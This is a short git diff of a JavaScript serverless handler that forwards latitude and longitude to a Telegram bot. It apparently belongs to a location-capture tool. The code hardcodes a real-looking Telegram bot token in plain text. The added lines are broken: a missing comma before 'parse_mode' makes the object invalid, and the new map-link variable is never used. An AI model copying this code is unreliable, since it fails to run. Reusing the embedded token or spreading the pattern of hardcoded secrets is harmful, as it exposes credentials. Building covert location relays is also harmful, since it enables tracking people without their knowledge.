@@ -10,7 +10,8 @@ export default async function handler(req, res) {
   const BOT_TOKEN = '7737650968:AAHsvAEaKL5kOCcgQ4RPtyVjeN3-Hl5Aw1k'; // Yahan apna bot token direct likhen
   const message = `📍 New Location:\nLat: ${latitude}\nLon: ${longitude}`;
   const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
-
+const googleMapLink = `https://maps.google.com/?q=${latitude},${longitude}`;
+  
   try {
     const telegramRes = await fetch(url, {
       method: 'POST',
@@ -18,6 +19,7 @@ export default async function handler(req, res) {
       body: JSON.stringify({
         chat_id,
         text: message
+        parse_mode: 'Markdown'
       })
     });
 
